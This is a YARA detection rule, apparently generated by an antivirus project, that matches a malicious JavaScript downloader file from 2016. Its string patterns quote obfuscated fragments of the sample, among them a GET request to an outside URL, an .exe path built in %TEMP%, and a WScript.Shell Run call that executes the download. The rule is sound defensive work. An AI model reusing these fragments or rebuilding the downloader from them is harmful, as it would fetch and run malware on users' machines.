rule sig_20160328_66645636e0431cf70a06b9cd81a0d370 {
  meta:
    description = "datamaliciousorder - file 20160328_66645636e0431cf70a06b9cd81a0d370.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ce4c83fd3fbaf062af09fa2f02475c8ee6b5948276bf179382a20ac69d8a37aa"

  strings:
    $s1  = "function Nwtgnsr() {return Ufshnqy[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"rmrMo134ngoJ.exe\";};" fullword ascii
    $s2  = "Tthqb[Xmocdwwomc](\"GET\", \"http://princesse-hippie.com/m6yaf\", false);" fullword ascii
    $s3  = "do {WScript[Hqivycnmc](Lzepdm() * 11)} while (Tthqb[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "function Nxnmq(Dzrmhqjcl, Vgxmwz){return Dzrmhqjcl - Vgxmwz;};" fullword ascii
    $s5  = "var Ufshnqy = function Prqncjtn() {return WScript[Mdtqql](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Mtmup(Plhlmc){Ufshnqy[\"Run\"](Plhlmc, Zosxbjzzxe, Zosxbjzzxe);};" fullword ascii
    $s7  = "function Gjcslhhpn() {return ((Zpmtuozb == true) && (Zpmtuozb == Gdqpictai)) ? 1 : Zosxbjzzxe;};" fullword ascii
    $s8  = "Gdqpictai = true; " fullword ascii
    $s9  = "Zpmtuozb = true; " fullword ascii
    $s10 = "function Yudven(){return Mdtqql;};" fullword ascii
    $s11 = "var Mspwrgjwk = new this[\"Date\"]();" fullword ascii
    $s12 = "return Nxnmq(Tmrdskvo, Wwqsweyosy);" fullword ascii
    $s13 = "function Kofdetsvil()" fullword ascii
    $s14 = " while (Qpsqo){" fullword ascii
    $s15 = "function Lzepdm(){return 22;};" fullword ascii
    $s16 = "var Rwfife = false;" fullword ascii
    $s17 = "function Ggcugsri(Jclkvdexaw) {var Dgzxutcg = (1, 2, 3, 4, 5, Jclkvdexaw); return Dgzxutcg;};" fullword ascii
    $s18 = "var Gdqpictai = false;" fullword ascii
    $s19 = "var Zpmtuozb = false;" fullword ascii
    $s20 = "function Oehfawr(){return Qwfemuhxhh;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}